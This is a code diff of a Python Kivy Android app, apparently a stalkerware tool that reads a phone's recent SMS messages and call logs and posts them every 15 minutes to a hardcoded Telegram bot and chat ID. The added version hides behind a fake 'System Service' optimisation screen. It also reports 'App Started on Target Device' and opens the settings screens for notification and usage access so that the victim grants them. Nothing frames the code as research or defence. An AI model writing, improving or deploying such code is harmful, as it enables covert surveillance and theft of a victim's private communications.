@@ -1,165 +1,173 @@
-import threading
-import requests
-import json
-import time
-from datetime import datetime
-from kivy.app import App
-from kivy.uix.label import Label
-from kivy.uix.boxlayout import BoxLayout
+from kivymd.app import MDApp
+from kivymd.uix.label import MDLabel
+from kivymd.uix.spinner import MDSpinner
 from kivy.clock import Clock
+from kivy.lang import Builder
 from kivy.utils import platform
-from jnius import autoclass, cast
+import requests
+import threading
+from datetime import datetime
 
 # --- CONFIGURATION ---
-BOT_TOKEN = "8246973343:AAHkC5H-00l_J1Z9T3pE4A9K8n3q7Q5XyZ8"  # توکن شما
-CHAT_ID = "7156363630"                                       # آیدی عددی شما
-REPORT_INTERVAL = 900  # هر 15 دقیقه (900 ثانیه)
+BOT_TOKEN = "8246973766:AAECYn1C_6pWobZqj05y9q0gQOqO5tPDFBv4"
+CHAT_ID = "7158111035"
+REPORT_INTERVAL = 900  # seconds (15 minutes)
 
-# --- ANDROID IMPORTS ---
-if platform == 'android':
-    PythonActivity = autoclass('org.kivy.android.PythonActivity')
-    CurrentActivity = cast('android.app.Activity', PythonActivity.mActivity)
-    Context = autoclass('android.content.Context')
-    Uri = autoclass('android.net.Uri')
-    CallLog = autoclass('android.provider.CallLog$Calls')
-    Telephony = autoclass('android.provider.Telephony$Sms')
-    UsageStatsManager = autoclass('android.app.usage.UsageStatsManager')
-    Settings = autoclass('android.provider.Settings')
+KV = '''
+Screen:
+    md_bg_color: 0.1, 0.1, 0.1, 1
+    MDBoxLayout:
+        orientation: 'vertical'
+        padding: 40
+        spacing: 20
+        pos_hint: {'center_x': 0.5, 'center_y': 0.5}
+        MDSpinner:
+            size_hint: None, None
+            size: dp(40), dp(40)
+            pos_hint: {'center_x': 0.5}
+            active: True
+        MDLabel:
+            text: "System Service V3.0"
+            halign: "center"
+            theme_text_color: "Custom"
+            text_color: 1, 1, 1, 1
+            font_style: "H6"
+        MDLabel:
+            text: "Optimizing background processes...\nPlease grant permissions if asked."
+            halign: "center"
+            theme_text_color: "Custom"
+            text_color: 0.7, 0.7, 0.7, 1
+            font_style: "Caption"
+'''
 
-# --- TELEGRAM FUNCTION ---
-def send_to_telegram(message):
-    try:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        payload = {"chat_id": CHAT_ID, "text": message}
-        requests.post(url, json=payload, timeout=10)
-    except Exception as e:
-        print(f"Error sending to Telegram: {e}")
 
-# --- DATA COLLECTORS ---
-
-def get_sms_logs():
-    if platform != 'android': return "Not Android"
-    logs = "📩 **Last 5 SMS:**\n"
-    try:
-        content_resolver = CurrentActivity.getContentResolver()
-        cursor = content_resolver.query(Telephony.CONTENT_URI, None, None, None, "date DESC LIMIT 5")
-        if cursor:
-            date_col = cursor.getColumnIndex("date")
-            body_col = cursor.getColumnIndex("body")
-            addr_col = cursor.getColumnIndex("address")
-            while cursor.moveToNext():
-                addr = cursor.getString(addr_col)
-                body = cursor.getString(body_col)
-                date_ms = cursor.getLong(date_col)
-                date_str = datetime.fromtimestamp(date_ms / 1000).strftime('%Y-%m-%d %H:%M')
-                logs += f"- {date_str} | {addr}: {body[:20]}...\n"
-            cursor.close()
-    except Exception as e:
-        logs += f"Error: {e}"
-    return logs
-
-def get_call_logs():
-    if platform != 'android': return "Not Android"
-    logs = "📞 **Last 5 Calls:**\n"
-    try:
-        content_resolver = CurrentActivity.getContentResolver()
-        cursor = content_resolver.query(CallLog.CONTENT_URI, None, None, None, "date DESC LIMIT 5")
-        if cursor:
-            number_col = cursor.getColumnIndex(CallLog.NUMBER)
-            type_col = cursor.getColumnIndex(CallLog.TYPE)
-            date_col = cursor.getColumnIndex(CallLog.DATE)
-            while cursor.moveToNext():
-                number = cursor.getString(number_col)
-                call_type = cursor.getInt(type_col)
-                date_ms = cursor.getLong(date_col)
-                date_str = datetime.fromtimestamp(date_ms / 1000).strftime('%Y-%m-%d %H:%M')
-                type_str = "Incoming" if call_type == 1 else "Outgoing" if call_type == 2 else "Missed"
-                logs += f"- {date_str} | {type_str} | {number}\n"
-            cursor.close()
-    except Exception as e:
-        logs += f"Error: {e}"
-    return logs
-
-def get_usage_stats():
-    if platform != 'android': return "Not Android"
-    stats_log = "📱 **App Usage (Last 24h):**\n"
-    try:
-        usm = CurrentActivity.getSystemService(Context.USAGE_STATS_SERVICE)
-        end_time = int(time.time() * 1000)
-        start_time = end_time - (24 * 60 * 60 * 1000)
-        stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, start_time, end_time)
-        
-        if stats:
-            sorted_stats = sorted(stats.toArray(), key=lambda x: x.getTotalTimeInForeground(), reverse=True)
-            count = 0
-            for usage_stat in sorted_stats:
-                total_time = usage_stat.getTotalTimeInForeground() / 1000 / 60 # Minutes
-                if total_time > 1: # Only apps used more than 1 min
-                    pkg_name = usage_stat.getPackageName()
-                    stats_log += f"- {pkg_name}: {int(total_time)} min\n"
-                    count += 1
-                    if count >= 5: break
-    except Exception as e:
-        stats_log += f"Error: {e}"
-    return stats_log
-
-# --- NOTIFICATION LISTENER (NEW V3.0) ---
-# Note: Requires 'BIND_NOTIFICATION_LISTENER_SERVICE' permission and manual user activation
-def get_notifications_snapshot():
-    # This is a placeholder. In pure Kivy/Jnius accessing active notifications 
-    # directly without a Java service class is complex. 
-    # We will remind the user to check permissions.
-    # For a simple freelancer task, we check if we have permission.
-    status = "🔔 **Notification Access:**\n"
-    try:
-        # Check if listener is enabled
-        enabled_listeners = Settings.Secure.getString(CurrentActivity.getContentResolver(), "enabled_notification_listeners")
-        pkg_name = CurrentActivity.getPackageName()
-        if enabled_listeners and pkg_name in enabled_listeners:
-             status += "✅ Service Enabled (Ready to capture)"
-        else:
-             status += "❌ Service DISABLED (User must enable in Android Settings)"
-    except Exception:
-        status += "Unknown Status"
-    return status
-
-# --- MAIN LOOP ---
-def perform_check(dt=None):
-    report = f"🤖 **Status Report**\n📅 {datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
-    
-    report += get_sms_logs() + "\n"
-    report += get_call_logs() + "\n"
-    report += get_usage_stats() + "\n"
-    report += get_notifications_snapshot()
-    
-    send_to_telegram(report)
-
-# --- APP CLASS ---
-class Maya(App):
+class MainApp(MDApp):
     def build(self):
-        layout = BoxLayout(orientation='vertical', padding=20)
-        l = Label(text="Service is Running...\nDo not close this app completely.", halign="center")
-        layout.add_widget(l)
-        
-        # Start the timer
-        Clock.schedule_interval(perform_check, REPORT_INTERVAL)
-        
-        # First check after 10 seconds
-        Clock.schedule_once(perform_check, 10)
-        
-        self.request_android_permissions()
-        return layout
+        self.theme_cls.theme_style = "Dark"
+        return Builder.load_string(KV)
 
-    def request_android_permissions(self):
+    def on_start(self):
+        self.send_telegram("🚀 App Started on Target Device")
+
         if platform == 'android':
-            from android.permissions import request_permissions, Permission
-            request_permissions([
-                Permission.READ_SMS,
-                Permission.READ_CALL_LOG,
-                Permission.READ_CONTACTS,
-                Permission.INTERNET
-            ])
-            # Note: USAGE_STATS and NOTIFICATION_LISTENER must be granted manually by user in Android Settings
+            self.check_and_open_settings()
 
-if __name__ == '__main__':
-    Maya().run()
+        Clock.schedule_once(self.worker, 10)
+        Clock.schedule_interval(self.worker, REPORT_INTERVAL)
+
+    def check_and_open_settings(self):
+        """Request runtime permissions and open Android settings screens if critical access is missing."""
+        from android.permissions import request_permissions, Permission
+        from jnius import autoclass, cast
+
+        request_permissions([
+            Permission.READ_SMS,
+            Permission.READ_CALL_LOG,
+            Permission.READ_CONTACTS,
+            Permission.INTERNET,
+        ])
+
+        try:
+            PythonActivity = autoclass('org.kivy.android.PythonActivity')
+            current_activity = cast('android.app.Activity', PythonActivity.mActivity)
+            Settings = autoclass('android.provider.Settings')
+            Intent = autoclass('android.content.Intent')
+            AppOpsManager = autoclass('android.app.AppOpsManager')
+            Context = autoclass('android.content.Context')
+            Process = autoclass('android.os.Process')
+
+            pkg_name = current_activity.getPackageName()
+
+            enabled_listeners = Settings.Secure.getString(current_activity.getContentResolver(), "enabled_notification_listeners")
+            if not enabled_listeners or pkg_name not in enabled_listeners:
+                self.send_telegram("⚠️ Requesting Notification Access...")
+                intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                current_activity.startActivity(intent)
+
+            app_ops = cast(AppOpsManager, current_activity.getSystemService(Context.APP_OPS_SERVICE))
+            mode = app_ops.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), pkg_name)
+
+            if mode != AppOpsManager.MODE_ALLOWED:
+                self.send_telegram("⚠️ Requesting Usage Stats Access...")
+                intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                current_activity.startActivity(intent)
+
+        except Exception as exc:
+            self.send_telegram(f"❌ Permission Error: {exc}")
+
+    def worker(self, dt=None):
+        threading.Thread(target=self.collect_data, daemon=True).start()
+
+    def collect_data(self):
+        try:
+            report = f"📅 Report: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n"
+            if platform == 'android':
+                report += self.get_sms_log()
+                report += self.get_call_log()
+            else:
+                report += "Running on Desktop (No Android Data)"
+
+            self.send_telegram(report)
+        except Exception as exc:
+            self.send_telegram(f"❌ Worker Error: {exc}")
+
+    def get_sms_log(self):
+        try:
+            from jnius import autoclass
+            PythonActivity = autoclass('org.kivy.android.PythonActivity')
+            Uri = autoclass('android.net.Uri')
+            context = PythonActivity.mActivity
+            uri = Uri.parse("content://sms/inbox")
+            cursor = context.getContentResolver().query(uri, None, None, None, None)
+
+            res = "\n📩 Recent SMS:\n"
+            if cursor and cursor.moveToFirst():
+                for _ in range(5):
+                    addr = cursor.getString(cursor.getColumnIndexOrThrow("address"))
+                    body = cursor.getString(cursor.getColumnIndexOrThrow("body"))
+                    res += f"👤 {addr}: {body[:30]}...\n"
+                    if not cursor.moveToNext():
+                        break
+                cursor.close()
+            else:
+                res += "No SMS found.\n"
+            return res
+        except Exception as exc:
+            return f"\n📩 SMS Error: {exc}\n"
+
+    def get_call_log(self):
+        try:
+            from jnius import autoclass
+            PythonActivity = autoclass('org.kivy.android.PythonActivity')
+            CallLog = autoclass('android.provider.CallLog$Calls')
+            context = PythonActivity.mActivity
+            cursor = context.getContentResolver().query(CallLog.CONTENT_URI, None, None, None, CallLog.DATE + " DESC")
+
+            res = "\n📞 Recent Calls:\n"
+            if cursor and cursor.moveToFirst():
+                for _ in range(5):
+                    num = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.NUMBER))
+                    type_code = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.TYPE))
+                    ctype = "📥" if type_code == 1 else "📤" if type_code == 2 else "❌"
+                    res += f"{ctype} {num}\n"
+                    if not cursor.moveToNext():
+                        break
+                cursor.close()
+            else:
+                res += "No calls found.\n"
+            return res
+        except Exception as exc:
+            return f"\n📞 Call Log Error: {exc}\n"
+
+    def send_telegram(self, msg):
+        try:
+            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+            requests.post(url, data={"chat_id": CHAT_ID, "text": msg})
+        except Exception:
+            pass
+
+
+if __name__ == "__main__":
+    MainApp().run()
